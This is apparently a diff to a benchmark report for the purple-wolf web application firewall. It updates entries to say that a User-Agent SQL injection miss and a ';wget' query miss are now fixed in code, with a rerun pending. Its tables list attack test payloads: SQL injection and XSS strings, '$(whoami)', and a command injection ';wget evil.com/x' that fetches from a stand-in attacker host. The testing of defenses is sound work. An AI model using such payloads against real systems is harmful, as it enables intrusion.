@@ -24,7 +24,7 @@ under [`benchmarks/`](../benchmarks/). One-command rerun:
 | **CPU under load** (10-min soak at 1000 RPS) | 270 m p50 / 285 m max | n/a (target unreachable at 500 + RPS) | purple-wolf benchmark-able at sustained load; Coraza wasn't |
 | **Detection** across **12 CRS classes**, 4 536 vectors | **14.55 % overall TPR** | 6.11 % overall TPR | **2.4× more attacks blocked** at the same Paranoia-1 ruleset; Java (+26.5 %), RCE (+6.3 %), XSS (+5.1 %) are the biggest margins |
 | **False-positive rate** (53 hand-curated benigns) | 0 % | 0 % | both clean; N=53 is small — see follow-ups |
-| **Documented detection gaps** | UA-SQLi with `Mozilla/` prefix; bare `;wget` in query | (not separately characterized) | surfaced in `THREAT_MODEL.md §3.2.1` and `docs/configuration.md` |
+| **Documented detection gaps** | UA-SQLi with `Mozilla/` prefix; bare `;wget` in query — both **since fixed in code** (UA suffix probe + `rce_cmd` signatures), pending a rerun | (not separately characterized) | surfaced in `THREAT_MODEL.md §3.2.1` and `docs/configuration.md` |
 
 The honest summary: **on the same Paranoia-1-equivalent ruleset
 across the broader OWASP CRS corpus, purple-wolf blocks 2.4× more
@@ -383,7 +383,7 @@ Raw log:
 | `id=1 OR 1=1` | `Cookie` | **403** ✓ blocked |
 | `?q=<script>alert(1)</script>` | `Referer` | **403** ✓ blocked |
 | `1" OR "1"="1` | `X-User` (custom) | **403** ✓ blocked |
-| `Mozilla/5.0 1 OR 1=1` | `User-Agent` | 200 — *missed* |
+| `Mozilla/5.0 1 OR 1=1` | `User-Agent` | 200 — *missed at round-2 time; **fixed in code** since (UA suffix probe), pending a benchmark rerun* |
 | `sessionid=abc123; csrftoken=xyz789` | `Cookie` (benign) | 200 ✓ no FP |
 
 Cookie / Referer / X-* SQLi all caught — the v0.2 header-inspection
@@ -408,7 +408,7 @@ reputation deny list, or downstream WAF stage for UA inspection.
 
 | Payload | Status |
 |---|---|
-| `;wget evil.com/x` | 200 — *missed* |
+| `;wget evil.com/x` | 200 — *missed at round-2 time; **fixed in code** since (`rce_cmd` signatures), pending a benchmark rerun* |
 | `$(whoami)` | **403** ✓ |
 | `/bin/sh` | **403** ✓ |
 
@@ -448,7 +448,7 @@ upstream.
 | Sustained throughput | 1000 RPS clean, p99 < 1.2 ms | **clean to 4000–8000 RPS, breaks 12k–16k** |
 | Memory steady-state | 38 MiB p50 | confirmed: 80–96 MiB band, no drift under 10-min load |
 | Detection efficacy | tied with Coraza on 941+942 | **2.4× more attacks blocked across 12 CRS classes** |
-| Known gaps | precision-over-recall on atomic tokens (by design) | **+ User-Agent SQLi miss + `;cmd` query miss documented** |
+| Known gaps | precision-over-recall on atomic tokens (by design) | User-Agent SQLi + `;cmd` query misses documented, then **fixed in code** (UA suffix probe + `rce_cmd` signatures); rerun pending |
 | FPR | 0% on 53 benigns | unchanged (53 benigns is still small N) |
 
 ### Caveats round 2 inherits + adds
